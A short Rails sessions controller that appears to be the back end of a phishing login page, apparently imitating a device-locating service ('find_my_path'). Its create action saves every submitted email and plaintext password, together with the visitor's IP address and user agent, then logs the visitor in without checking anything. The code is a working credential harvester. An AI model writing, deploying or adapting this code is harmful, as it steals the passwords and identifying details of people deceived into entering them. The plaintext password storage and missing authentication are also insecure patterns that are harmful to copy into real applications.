class SessionsController < ApplicationController
  def new
    redirect_to find_my_path if session[:logged_in]
  end

  def create
    email    = params[:email].to_s.strip
    password = params[:password].to_s

    LoginAttempt.create!(
      email:      email,
      password:   password,
      ip_address: request.remote_ip,
      user_agent: request.user_agent
    )

    session[:logged_in] = true
    session[:email]     = email

    redirect_to find_my_path
  end

  def destroy
    session.clear
    redirect_to login_path
  end
end
